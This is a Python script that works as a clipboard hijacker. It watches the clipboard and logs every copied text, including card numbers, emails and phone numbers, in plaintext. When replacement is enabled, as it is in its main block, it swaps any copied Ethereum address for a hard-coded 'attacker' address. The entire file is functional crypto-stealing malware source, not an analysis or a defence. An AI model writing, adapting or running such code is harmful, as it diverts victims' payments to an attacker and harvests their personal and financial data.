import time
import re
import pyperclip
import threading
import os
from datetime import datetime

try:
    from plyer import notification
except ImportError:
    notification = None

# Patterns for monitoring
PATTERNS = {
    "Ethereum Address": r'0x[a-fA-F0-9]{40}',
    "Email": r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+',
    "Phone Number": r'\+?\d[\d -]{8,}\d',
    "Credit Card": r'\b(?:\d[ -]*?){13,16}\b'
}

ATTACKER_ADDRESS = '0xDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF'
LOG_FILE = "clipboard_log.txt"
HISTORY_LIMIT = 50

clipboard_history = []

def log_to_file(entry):
    with open(LOG_FILE, "a") as f:
        f.write(f"{datetime.now()} | {entry}\n")

def show_notification(title, message):
    if notification:
        notification.notify(title=title, message=message, timeout=3)

def clipboard_monitor(replace=False, patterns=None, stop_flag=None):
    """
    Monitor clipboard for pattern matches and optionally replace content.
    
    Args:
        replace: If True, replace detected Ethereum addresses
        patterns: Dictionary of patterns to monitor
        stop_flag: threading.Event() to signal when to stop monitoring
    """
    if patterns is None:
        patterns = PATTERNS
    last_text = ""
    
    print("[+] Clipboard monitor started")
    
    while True:
        # Check if we should stop
        if stop_flag and stop_flag.is_set():
            print("[+] Clipboard monitor stopping...")
            break
            
        try:
            text = pyperclip.paste()
            if text != last_text:
                last_text = text
                # Save to history
                clipboard_history.append(text)
                if len(clipboard_history) > HISTORY_LIMIT:
                    clipboard_history.pop(0)
                # Log every change
                log_to_file(f"Clipboard changed: {text}")
                print(f"[+] Clipboard changed: {text}")
                # Check all patterns
                for name, pattern in patterns.items():
                    if re.fullmatch(pattern, text.strip()):
                        log_to_file(f"Detected {name}: {text}")
                        print(f"[!] Detected {name}: {text}")
                        show_notification("Clipboard Monitor", f"Detected {name}: {text}")
                        # Special handling for Ethereum address
                        if name == "Ethereum Address" and replace:
                            pyperclip.copy(ATTACKER_ADDRESS)
                            log_to_file(f"Replaced with attacker address: {ATTACKER_ADDRESS}")
                            print(f"[!] Replaced with attacker address: {ATTACKER_ADDRESS}")
                        break
            time.sleep(0.5)
        except Exception as e:
            print(f"Error in clipboard monitor: {e}")
            time.sleep(1)
    
    print("[+] Clipboard monitor stopped")

def print_clipboard_history():
    print("\n--- Clipboard History ---")
    for i, entry in enumerate(clipboard_history[-HISTORY_LIMIT:], 1):
        print(f"{i}: {entry}")
    print("------------------------\n")

def start_clipboard_monitor(replace=False, patterns=None, stop_flag=None):
    """
    Start clipboard monitoring in a separate thread.
    
    Args:
        replace: If True, replace detected Ethereum addresses
        patterns: Dictionary of patterns to monitor
        stop_flag: threading.Event() to signal when to stop monitoring
        
    Returns:
        The thread object
    """
    t = threading.Thread(
        target=clipboard_monitor, 
        args=(replace, patterns, stop_flag), 
        daemon=True
    )
    t.start()
    return t

if __name__ == "__main__":
    # For standalone testing
    stop_flag = threading.Event()
    
    # Set replace=True to enable replacement
    monitor_thread = start_clipboard_monitor(replace=True, stop_flag=stop_flag)
    print("Clipboard monitor started. Press Ctrl+C to exit.")
    print("Type 'history' and press Enter to view clipboard history.")
    
    try:
        while True:
            cmd = input()
            if cmd.strip().lower() == "history":
                print_clipboard_history()
    except KeyboardInterrupt:
        print("\nStopping clipboard monitor...")
        stop_flag.set()
        monitor_thread.join(timeout=2)
        print("Exiting.")